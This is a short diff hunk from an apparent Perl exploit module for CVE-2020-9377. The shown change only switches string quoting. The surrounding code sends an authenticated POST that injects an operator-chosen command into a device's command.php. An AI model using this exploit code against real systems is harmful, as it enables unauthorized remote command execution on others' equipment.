@@ -26,11 +26,11 @@ package Spellbook::Advisory::CVE_2020_9377 {
             my $payload   = "cmd=$command";
 
             my $headers   = HTTP::Headers -> new (
-                'Content-Type' => "application/x-www-form-urlencoded",
+                'Content-Type' => 'application/x-www-form-urlencoded',
                 'Cookie' => "uid=$cookie"
             );
 
-            my $request   = HTTP::Request -> new("POST", "$target/command.php", $headers, $payload);
+            my $request   = HTTP::Request -> new('POST', "$target/command.php", $headers, $payload);
             my $response  = $user_agent -> request($request);
 
             if ($response -> code() == 200) {
